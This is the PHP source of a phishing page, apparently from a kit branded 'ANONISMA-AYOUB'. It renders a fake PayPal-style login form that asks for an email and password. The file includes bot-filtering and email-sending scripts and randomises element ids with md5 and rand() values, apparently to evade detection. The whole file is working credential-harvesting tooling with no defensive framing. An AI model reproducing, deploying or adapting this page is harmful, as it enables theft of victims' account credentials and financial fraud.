<?php
session_start();
@ini_set('display_errors', 0);
error_reporting(E_ALL ^ E_NOTICE);
date_default_timezone_set('GMT');
include('../edit/lang.php');
include('../edit/bots.php');
include('../edit/______________email.php');	
include "./lang".$_SESSION['ANONISMA-AYOUB'];
echo "<!DOCTYPE html>
<html lang=\"en\"><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">
  <meta charset=\"utf-8\">
<title>   ".$aaaaaaaal22."   -  ".$_SESSION['AYCOUNT']."  </title>
  <link rel=\"stylesheet\" href=\"./lib/css/bootstrap.css\">
  		<link rel=\"shortcut icon\" link rel=\"logo-icon\" href=\"lib/css/img/anon-7.png\">
		  <meta name=\"viewport\" content=\"initial-scale=1.0\">
</head>
<body>
<!--
   _____   ______   _____   __      __  _____    _____   ______       _____              __     __  _____               _      
  / ____| |  ____| |  __ \  \ \    / / |_   _|  / ____| |  ____|     |  __ \      /\     \ \   / / |  __ \      /\     | |     
 | (___   | |__    | |__) |  \ \  / /    | |   | |      | |__        | |__) |    /  \     \ \_/ /  | |__) |    /  \    | |     
  \___ \  |  __|   |  _  /    \ \/ /     | |   | |      |  __|       |  ___/    / /\ \     \   /   |  ___/    / /\ \   | |     
  ____) | | |____  | | \ \     \  /     _| |_  | |____  | |____      | |       / ____ \     | |    | |       / ____ \  | |____ 
 |_____/  |______| |_|  \_\     \/     |_____|  \_____| |______|     |_|      /_/    \_\    |_|    |_|      /_/    \_\ |______|
                       
-->
  <div  for=\" ".md5(gmdate('r'))." \"  id=\"page\">
    <div  for=\" ".md5(gmdate('r'))." \"  id=\"content\" class=\"contenidor-content\">
      <header>
        <div  id=\" ".rand(9999999999, 999999999999999999999999)." \"  class=\"logo-header-svg\"></div>
      </header>
      <div  for=\" ".md5(gmdate('r'))." \"  id=\"ras-dafhaaa\" class=\"ras-dafhaaa \">
        <section id=\"login\" class=\"login\">
          <form  for=\" ".md5(gmdate('r'))." \"  ".$Edit_Curl." method=\"post\" class=\"proceed maskable\" id=\"formulario\" name=\"login\">
            <div id=\"pass-sect\" class=\"footer-sec\">
			<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"error-assat\">
			<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"lisar\"><img src=\"./images/error.png\"></div>
			<div class=\"liman\" > ".$aaaaaaaal34." </div>
			</div>
              <div class=\"a-n-o-n-i-s-m-a\" id=\"login_emaildiv\">
								<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"a-n-o-n-i-s-m-a\" style=\"z-index: 100;\">
									<div  for=\" ".md5(gmdate('r'))." \"  class=\"khana-jadida tikchb-ila\">
										<input  for=\" ".md5(gmdate('r'))." \"  class=\"controlar-formu\" type=\"text\" name=\"EM\" type=\"email\" placeholder=\" ".$aaaaaaaal23." \" id=\"emay-add\">
									</div>
									<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"ghalat-assi\">
										<p> ".$aaaaaaaal24." </p>
									</div>
								</div>
								<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"a-n-o-n-i-s-m-a\">
									<div class=\"khana-jadida tikchb-ila\">
										<input  for=\" ".md5(gmdate('r'))." \"  class=\"controlar-formu\" type=\"password\" name=\"PS\" type=\"password\" placeholder=\" ".$aaaaaaaal25." \" id=\"password\">								
									</div>
									<div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"ghalat-assi\">
										<p  for=\" ".md5(gmdate('r'))." \" > ".$aaaaaaaal26." </p>
									</div>
								</div>
            </div>
            <div   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"af3al cuerpooo\">
              <button class=\"button zidbut\" type=\"submit\" id=\"botdkhol\" name=\"botdkhol\" value=\"Login\"> ".$aaaaaaaal27." </button>
            </div>
            <div class=\"lineab\"><a href=\"#\" id=\"tfkar-lpass\" class=\"nsiti-pass\"> ".$aaaaaaaal28." </a>
              <div class=\"pwr-modal\" id=\"nsalpas-mskin\">
              </div>
            </div>
          </form><a href=\"#\" class=\"button tanitalt\" id=\"ftahcont-jdid\"> ".$aaaaaaaal29." </a></section>
		  <br>
      </div>
    </div>
			<div  for=\" ".md5(gmdate('r'))." \"  class=\"dorawlididor\">
				<p class=\"anchofhhh\"> ".$aaaaaaaal42." </p>
			</div>
  </div>
  <footer   id=\" ".rand(9999999999, 999999999999999999999999)." \"   class=\"footer footer-sec\">
    <ul>
      <li   id=\" ".rand(9999999999, 999999999999999999999999)." \"  ><a href=\"#\"> ".$aaaaaaaal30." </a></li>
      <li><a href=\"#\"> ".$aaaaaaaal31." </a></li>
      <li   id=\" ".rand(9999999999, 999999999999999999999999)." \"  ><a href=\"#\"> ".$aaaaaaaal32." </a></li>
    </ul>
	<br>
	    <ul>
      <li  for=\" ".md5(gmdate('r'))." \" ><a href=\"#\">Copyright © 1999 -  ".date("Y")."  .  ".$aaaaaaaal33." </a></li>
    </ul>
  </footer>
	<script type=\"text/javascript\" src=\"./lib/js/jquery.1.11.1.min.js\"></script>
	<script type=\"text/javascript\" src=\"./lib/js/login.js\"></script>
</body></html>\n"; 
?>